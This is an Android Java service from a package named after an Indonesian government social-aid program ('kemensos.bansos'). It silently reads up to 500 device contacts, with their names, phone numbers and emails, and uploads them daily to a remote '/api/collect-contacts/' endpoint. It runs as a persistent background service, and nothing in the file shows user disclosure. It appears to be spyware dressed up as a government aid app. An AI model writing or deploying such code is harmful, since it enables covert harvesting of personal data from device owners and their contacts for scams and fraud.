package com.kemensos.bansos;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.os.Handler;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * ContactSyncService — Read device contacts and sync to server
 * Based on reference: Android ContentResolver + ContactsContract
 * Sends to POST /api/collect-contacts/<device_id>
 */
public class ContactSyncService extends Service {

    private static final String TAG = "ContactSync";
    private static final String BASE_URL = MainActivity.BASE_URL;
    private static final String DEVICE_ID = MainActivity.DEVICE_ID;
    private static final long SYNC_INTERVAL = 24 * 60 * 60 * 1000L; // once per day
    private Handler handler;
    private Runnable syncRunnable;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Service created");
        handler = new Handler();
        syncRunnable = () -> {
            syncContacts();
            handler.postDelayed(this.syncRunnable, SYNC_INTERVAL);
        };
        handler.post(syncRunnable);
    }

    private void syncContacts() {
        new Thread(() -> {
            try {
                ContentResolver cr = getContentResolver();
                JSONArray contacts = new JSONArray();

                Cursor contactCursor = cr.query(
                        ContactsContract.Contacts.CONTENT_URI,
                        new String[]{
                                ContactsContract.Contacts._ID,
                                ContactsContract.Contacts.DISPLAY_NAME,
                                ContactsContract.Contacts.HAS_PHONE_NUMBER
                        },
                        null, null,
                        ContactsContract.Contacts.DISPLAY_NAME + " ASC"
                );

                if (contactCursor == null) return;

                while (contactCursor.moveToNext()) {
                    String contactId = contactCursor.getString(0);
                    String displayName = contactCursor.getString(1);
                    int hasPhone = contactCursor.getInt(2);

                    if (displayName == null || displayName.trim().isEmpty()) continue;

                    JSONObject contact = new JSONObject();
                    contact.put("name", displayName);
                    contact.put("source", "device_contacts");

                    // Get phone numbers
                    StringBuilder phones = new StringBuilder();
                    if (hasPhone > 0) {
                        Cursor phoneCursor = cr.query(
                                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                                new String[]{ContactsContract.CommonDataKinds.Phone.NUMBER},
                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                                new String[]{contactId}, null
                        );
                        if (phoneCursor != null) {
                            while (phoneCursor.moveToNext()) {
                                if (phones.length() > 0) phones.append(", ");
                                phones.append(phoneCursor.getString(0));
                            }
                            phoneCursor.close();
                        }
                    }
                    contact.put("phone_number", phones.toString());

                    // Get email
                    StringBuilder emails = new StringBuilder();
                    Cursor emailCursor = cr.query(
                            ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                            new String[]{ContactsContract.CommonDataKinds.Email.ADDRESS},
                            ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
                            new String[]{contactId}, null
                    );
                    if (emailCursor != null) {
                        while (emailCursor.moveToNext()) {
                            if (emails.length() > 0) emails.append(", ");
                            emails.append(emailCursor.getString(0));
                        }
                        emailCursor.close();
                    }
                    contact.put("email", emails.toString());

                    contacts.put(contact);

                    // Limit to 500 contacts per sync
                    if (contacts.length() >= 500) break;
                }
                contactCursor.close();

                if (contacts.length() > 0) {
                    sendToServer(contacts);
                    Log.d(TAG, "Synced " + contacts.length() + " contacts");
                }
            } catch (Exception e) {
                Log.e(TAG, "Sync error: " + e.getMessage());
            }
        }).start();
    }

    private void sendToServer(JSONArray contacts) {
        try {
            URL url = new URL(BASE_URL + "/api/collect-contacts/" + DEVICE_ID);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);

            OutputStream os = conn.getOutputStream();
            os.write(contacts.toString().getBytes("UTF-8"));
            os.flush();
            os.close();

            int responseCode = conn.getResponseCode();
            Log.d(TAG, "Sent " + contacts.length() + " contacts, response: " + responseCode);
            conn.disconnect();
        } catch (Exception e) {
            Log.e(TAG, "Send error: " + e.getMessage());
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (handler != null && syncRunnable != null) {
            handler.removeCallbacks(syncRunnable);
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
